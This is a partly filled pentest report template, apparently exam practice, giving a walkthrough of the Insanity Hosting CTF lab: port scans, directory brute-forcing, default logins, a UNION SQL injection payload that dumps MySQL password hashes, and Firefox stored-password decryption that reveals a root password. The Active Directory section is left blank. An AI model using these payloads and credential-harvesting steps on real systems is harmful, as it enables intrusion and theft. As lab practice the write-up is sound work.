- **Independent Challenges**
- **1 Target #1 – 192.168.110.150**
- **1.1 Initial Access –**

**Vulnerability Explanation:**

**Vulnerability Fix:**

**Severity:**

**Steps to reproduce the attack:**

- **1.1 Service Enumeration**

└─# nmap -p- --min-rate=20000 192.168.110.150

![[InsanityHosting image.png]]

**Port Scan Results**

| **IP Address** | **Ports Open** |
| --- | --- |
| 192.168.110.150 | **TCP**: 21,22,80 |

└─# nmap -p21,22,80 -sV -sC --min-rate=20000 192.168.110.150 -o nmap-sv-sc-p21_22_80.txt

![[InsanityHosting image 1.png]]

Port 21 - FTP

Version

vsftpd 3.0.2

Anonymous Login

└─# ftp 192.168.110.150

![[InsanityHosting image 2.png]]

![[InsanityHosting image 3.png]]

Port 22 - SSH

openssh 7.4

Port 80 - HTTP

Apache 2.4.6

Directory Enumeration

└─# feroxbuster -u http://192.168.110.150 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt  -g

![[InsanityHosting image 4.png]]

![[InsanityHosting image 5.png]]

BrowserAccess

![[InsanityHosting image 6.png]]

http://192.168.110.150/monitoring/login.php

![[InsanityHosting image 7.png]]

http://192.168.110.150/phpmyadmin

![[InsanityHosting image 8.png]]

http://192.168.110.150/news

![[InsanityHosting image 9.png]]

**Otis**

**Use Otis & 123456**

![[InsanityHosting image 10.png]]

![[InsanityHosting image 11.png]]

**SQLInjection**

![[InsanityHosting image 12.png]]

![[InsanityHosting image 13.png]]

1" union  select  1,user,password,authentication_string from mysql. user # is down.

Please check the report below for more information.

ID, Host, Date Time, Status

1,root,*CDA244FF510B063DA17DFF84FF39BA0849F7920F,

1,,,

1,elliot,,*5A5749F309CAC33B27BA94EE02168FA3C3E7A3E9

![[InsanityHosting image 14.png]]

**elliot123**

**1.2** **Initial Access –**

![[InsanityHosting image 15.png]]

**1.3** **Privilege Escalation -**

![[InsanityHosting image 16.png]]

└─# python firefox_decrypt.py esmhp32w.default-default

2024-09-14 06:30:31,886 - WARNING - profile.ini not found in esmhp32w.default-default

2024-09-14 06:30:31,886 - WARNING - Continuing and assuming 'esmhp32w.default-default' is a profile location

Website:   https://localhost:10000

Username: 'root'

Password: 'S8Y389KJqWpJuSwFqFZHwfZ3GnegUa'

**1.4** **Post Exploitation**

**Proof.txt value:**

\[elliot@insanityhosting ~\]$ su root

パスワード:

\[root@insanityhosting elliot\]# id

uid=0(root) gid=0(root) groups=0(root)

\[root@insanityhosting elliot\]# cd /root/

\[root@insanityhosting ~\]# ls

anaconda-ks.cfg  flag.txt

\[root@insanityhosting ~\]# cat flag.txt

____                       _ __

/  _/___  _________ _____  (_) /___  __

/ // __ \/ ___/ __ \`/ __ \/ / __/ / / /

_/ // / / (__  ) /_/ / / / / / /_/ /_/ /

/___/_/ /_/____/\__,_/_/ /_/_/\__/\__, /

/____/

Well done for completing Insanity. I want to know how difficult you found this - let me know on my blog here: https://security.caerdydd.wales/insanity-ctf/

Follow me on twitter @bootlesshacker

https://security.caerdydd.wales

Please let me know if you have any feedback about my CTF - getting feedback for my CTF keeps me interested in making them.

Thanks!

Bootlesshacker

\[root@insanityhosting ~\]#

![[InsanityHosting image 17.png]]

- **Active Directory Set**

**Port Scan Results**

| **IP Address** | **Ports Open** |
| --- | --- |
|  | **TCP:** |
|  | **TCP:** |
|  | **TCP:** |

- **1  –**
- **1.1 Initial Access –**

**Vulnerability Explanation:**

**Vulnerability Fix:**

**Severity:** **Critical**

**Steps to reproduce the attack:**

- **1.2 Privilege Escalation –**

**Vulnerability Explanation:**

**Vulnerability Fix:**

**Severity:** **Critical**

**Steps to reproduce the attack:**

- **1.3 Post-Exploitation**

**System Proof screenshot:**

- **2  –**
- **2.1 Initial Access –**

**Steps to reproduce the attack:**

- **2.2 Post-Exploitation**

**Local Proof Screenshot:**

- **3 DC –**
- **5.3.1 Initial Access –**

**Steps to reproduce the attack:**

- **3.2 Post-Exploitation**

**System Proof Screenshot:**